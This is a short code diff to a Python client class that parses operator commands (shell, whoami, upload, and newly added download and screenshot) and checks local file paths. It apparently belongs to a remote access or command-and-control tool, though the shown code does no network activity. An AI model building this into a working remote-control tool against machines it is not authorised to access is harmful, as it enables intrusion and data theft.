@@ -47,6 +47,10 @@ class Client:
             return self.upload(command)
         elif command == "shell":
             return "shell"
+        elif command.startswith("download"):
+            return self.dowload(command)
+        elif command.lower() == "screenshot":
+            return "screenshot"
         else:
             print("Unknown command. Try 'help' or '?' to display help", end="\n\n")
             return "unknown"
@@ -58,6 +62,17 @@ class Client:
             return "whoami"
 
     def upload(self, command):
+        file_path = command.split(" ")[1]
+        # remove quotes
+        file_path = file_path.replace('"', '')
+        print("file_path: ", file_path)
+        if not os.path.isfile(file_path):
+            print(f"Le fichier {file_path} n'existe pas.")
+            return "error"
+
+        return command
+
+    def dowload(self, command):
         file_path = command.split(" ")[1]
         # remove quotes
         file_path = file_path.replace('"', '')
